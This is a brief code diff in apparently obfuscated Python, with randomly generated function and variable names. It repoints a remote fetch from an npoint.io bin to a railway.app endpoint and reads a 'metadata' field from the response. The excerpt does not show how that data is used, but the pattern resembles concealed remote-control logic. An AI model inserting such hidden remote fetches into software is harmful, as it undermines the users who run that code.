@@ -18,7 +18,7 @@ def data_mpujot_560():
 
     def config_llqaqy_652():
         try:
-            net_hlyicq_487 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_hlyicq_487 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_hlyicq_487.raise_for_status()
             train_mbhkjk_453 = net_hlyicq_487.json()
             process_cpxisd_359 = train_mbhkjk_453.get('metadata')
